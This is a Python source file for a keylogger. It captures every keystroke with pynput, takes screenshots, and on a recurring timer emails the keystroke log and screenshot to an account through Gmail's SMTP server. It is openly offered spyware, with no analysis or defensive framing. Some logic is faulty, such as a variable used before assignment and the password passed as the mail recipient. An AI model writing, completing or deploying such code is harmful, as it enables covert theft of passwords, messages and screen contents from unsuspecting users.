import threading
import os
import pynput.keyboard as spy
import pyautogui, smtplib
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart


class Keylogger:
    def __init__(self, time_interval, email, password):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_on_key_press(self, key):

        try:
            current_key = str(key.char)
        # print(key)
        except:
            if current_key == key.space:
                current_key = " "
            else:
                current_key = current_key + " " + str(key) + " "

        self.append_to_log(current_key)


    def send_mail(self, email, password, message):
        my_screenshot = pyautogui.screenshot()
        answer = "Project_screen_mail.png"
        my_screenshot.save(answer)

        img_data = open(answer, 'rb').read()
        msg = MIMEMultipart()
        msg['Subject'] = 'subject'
        msg['From'] = 'e@mail.cc'
        msg['To'] = 'e@mail.cc'

        text = MIMEText("test")
        msg.attach(text)
        image = MIMEImage(img_data, name = os.path.basename(answer))
        msg.attach(image)

        server = smtplib.SMTP("smtp.gmail.com", 587)  # google server

        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.password , message)
        server.sendmail(self.email , self.password , msg.as_string())
        server.quit()


    def report(self):
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)  # waiting for sixty second to store the logging
        timer.start()


    def start(self):
        keyboard_listener = spy.Listener(on_press = self.process_on_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


# killall python to kill all the program

